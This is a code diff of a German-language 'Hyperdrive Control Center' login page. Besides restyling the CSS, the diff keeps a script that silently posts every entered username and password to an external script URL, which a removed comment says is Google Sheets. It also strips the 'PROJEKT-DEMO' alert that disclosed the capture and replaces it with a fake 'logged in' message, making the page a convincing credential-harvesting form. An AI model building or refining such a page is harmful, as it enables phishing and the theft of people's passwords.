@@ -5,96 +5,115 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyperdrive Control Center - Login</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             background-color: #0d1117;
-            color: #58a6ff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
         }
+
         .container {
             width: 100%;
-            max-width: 380px;
-            padding: 40px;
-            border: 2px solid #238636;
-            border-radius: 10px;
+            max-width: 360px;
+            padding: 40px 36px;
             background-color: #161b22;
-            box-shadow: 0 0 20px rgba(35, 134, 54, 0.5);
-            box-sizing: border-box;
+            border: 1px solid #21262d;
+            border-radius: 12px;
         }
-        h1 { 
-            color: #2ea44f; 
-            margin-bottom: 20px; 
+
+        h1 {
+            color: #e6edf3;
+            font-size: 1.3em;
+            font-weight: 600;
             text-align: center;
-            font-size: 1.8em;
+            margin-bottom: 28px;
+            letter-spacing: 0.5px;
         }
+
         .form-group {
-            margin-bottom: 20px;
-            text-align: left;
+            margin-bottom: 16px;
         }
+
         label {
             display: block;
             color: #8b949e;
-            margin-bottom: 8px;
-            font-size: 0.9em;
+            margin-bottom: 6px;
+            font-size: 0.85em;
         }
+
         input[type="text"],
         input[type="password"] {
             width: 100%;
-            padding: 10px;
+            padding: 10px 12px;
             border: 1px solid #30363d;
             border-radius: 6px;
             background-color: #0d1117;
-            color: #c9d1d9;
-            font-size: 1em;
-            box-sizing: border-box;
-            transition: 0.3s;
+            color: #e6edf3;
+            font-size: 0.95em;
+            transition: border-color 0.2s;
         }
+
         input[type="text"]:focus,
         input[type="password"]:focus {
             outline: none;
-            border-color: #58a6ff;
-            box-shadow: 0 0 5px rgba(88, 166, 255, 0.3);
+            border-color: #388bfd;
         }
+
         .btn {
             display: block;
             width: 100%;
             background-color: #238636;
-            color: white;
-            padding: 12px;
+            color: #fff;
+            padding: 11px;
             border: none;
             border-radius: 6px;
-            font-weight: bold;
-            font-size: 1em;
+            font-weight: 600;
+            font-size: 0.95em;
             cursor: pointer;
-            margin-top: 25px;
-            transition: 0.3s;
+            margin-top: 22px;
+            transition: background-color 0.2s;
         }
-        .btn:hover { 
-            background-color: #2ea44f; 
+
+        .btn:hover {
+            background-color: #2ea44f;
+        }
+
+        .success-msg {
+            display: none;
+            text-align: center;
+            color: #3fb950;
+            font-size: 0.9em;
+            margin-top: 16px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>HYPERDRIVE LOGIN</h1>
-        
+        <h1>Hyperdrive Login</h1>
+
         <form id="loginForm">
             <div class="form-group">
-                <label for="username">Identifikations-ID (Nutzername)</label>
-                <input type="text" id="username" required autocomplete="off">
+                <label for="username">Nutzername</label>
+                <input type="text" id="username" placeholder="Nutzername eingeben" required autocomplete="off">
             </div>
-            
+
             <div class="form-group">
-                <label for="password">Zugriffscode (Passwort)</label>
-                <input type="password" id="password" required>
+                <label for="password">Passwort</label>
+                <input type="password" id="password" placeholder="Passwort eingeben" required>
             </div>
-            
-            <button type="submit" class="btn">Authentifizieren</button>
+
+            <button type="submit" class="btn">Anmelden</button>
         </form>
+
+        <p class="success-msg" id="successMsg">✓ Erfolgreich angemeldet</p>
     </div>
 
     <script>
@@ -106,7 +125,6 @@
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
 
-            // Daten an Google Sheets senden
             fetch(SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -114,8 +132,9 @@
                 body: JSON.stringify({ username: user, password: pass })
             });
 
-            // Demo-Alert wie vorher
-            alert("PROJEKT-DEMO\n\nFolgende Daten wurden erfolgreich verarbeitet:\nNutzername: " + user + "\nPasswort: " + pass);
+            // Kein Pop-up – stattdessen kleine Erfolgsmeldung
+            document.getElementById('successMsg').style.display = 'block';
+            document.getElementById('loginForm').reset();
         });
     </script>
 </body>
